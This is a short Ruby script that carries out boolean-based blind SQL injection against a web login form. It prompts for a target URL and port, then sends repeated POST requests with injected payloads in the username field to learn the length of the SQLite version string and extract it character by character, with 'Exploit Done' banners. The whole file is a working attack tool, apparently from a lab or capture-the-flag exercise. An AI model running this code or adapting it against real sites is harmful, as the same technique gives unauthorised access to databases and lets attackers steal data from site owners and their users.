require "net/http"
require "uri"

print "Enter URL: "
weburl = gets.strip
print "Enter port number: "
port = gets.strip
puts "------------------------------CHECKING SQL INJECTION-------------------------------"
uri = URI(weburl+":"+port)
http = Net::HTTP.new(uri.host, uri.port)
length = 0
for i in 1..200 do
    request = Net::HTTP::Post.new(uri.request_uri)
    payload = "admin' AND (select '1' from users where 1=1 AND LENGTH(sqlite_version())=#{i})='1' --"
    request.set_form_data({"user" => payload, "pass" => "admin"})
    response = http.request(request)
    #puts response.body
    # response.body if response.is_a?(Net::HTTPSuccess)
    if  response.body == "Logged in successfully"
        puts "Database version length is '#{i}'"
        length = i
        break;
    end;
end;
puts "------------------------------Exploiting database version -------------------------------"
alphabet_array = [*'a'..'z', *'A'..'Z', *'0'..'9','.']
version = ""
for i in 0..length
    for k in alphabet_array
        request2 = Net::HTTP::Post.new(uri.request_uri)
        payload2 = "admin' AND (select '1' from users where 1=1 AND substr(sqlite_version(),#{i},1)='#{k}')='1' --"
        request2.set_form_data({"user" => payload2, "pass" => "admin"})
        response2 = http.request(request2)
        #puts response2.body
        # response.body if response.is_a?(Net::HTTPSuccess)
        if  response2.body == "Logged in successfully"
            version += k
            #puts k
        end;
    end
end
puts "database version is sqlite3 #{version}"
puts "------------------------------Exploit Done--------------------------------"